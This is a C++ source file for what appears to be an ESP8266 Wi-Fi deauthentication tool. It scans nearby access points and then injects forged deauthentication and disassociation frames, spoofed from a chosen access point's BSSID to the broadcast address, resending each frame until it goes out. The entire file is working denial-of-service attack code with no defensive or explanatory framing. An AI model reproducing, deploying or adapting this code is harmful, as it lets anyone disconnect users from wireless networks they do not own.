#include "Deauth.h"

Deauth::Deauth() {
  ap_list = new SimpleList<AccessPoint>;
}

void Deauth::startDeauth(AccessPoint ap) {
  uint16_t packetSize = sizeof(deauthPacket);
  const uint8_t broadcast[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
  uint8_t curr_channel = 0;

  memcpy(&deauthPacket[4], broadcast, 6);
  memcpy(&deauthPacket[10], ap.BSSID, 6);
  memcpy(&deauthPacket[16], ap.BSSID, 6);
  deauthPacket[0] = 0xc0;

  if ((ap.channel != curr_channel) && (ap.channel > 0) && (ap.channel < 15)) {
    curr_channel = ap.channel;
    wifi_set_channel(curr_channel);
  }

  Serial.println("Send deauth frame to " + ap.ssid);
  bool sent = wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == 0;
  while (sent == false) {
    sent = wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == 0;
    yield();
  }

  Serial.println("Send disassociate frame to " + ap.ssid);
  sent = false;
  deauthPacket[0] = 0xa0;
  sent = wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == 0;
  while (sent == false) {
    sent = wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == 0;
    yield();
  }
}

SimpleList<AccessPoint>* Deauth::getAccessPoints(){
  return ap_list;
}

void Deauth::startScan() {
  WiFi.scanDelete();
  ap_list->clear();
  int found = WiFi.scanNetworks(false, true);
  for (int i = 0; i < found; i++)
  {
    AccessPoint ap;
    WiFi.getNetworkInfo(i, ap.ssid, ap.encryptionType, ap.RSSI, ap.BSSID, ap.channel, ap.isHidden);
    ap.s_bssid = WiFi.BSSIDstr(i);

    //Print found APs
    Serial.printf("%d: %s, Ch:%d (%ddBm) %s %s %s\n", i + 1, ap.ssid.c_str(), ap.channel, ap.RSSI, ap.encryptionType == ENC_TYPE_NONE ? "open" : "", ap.isHidden ? "hidden" : "", ap.s_bssid.c_str());
    ap_list->add(ap);
  }
}
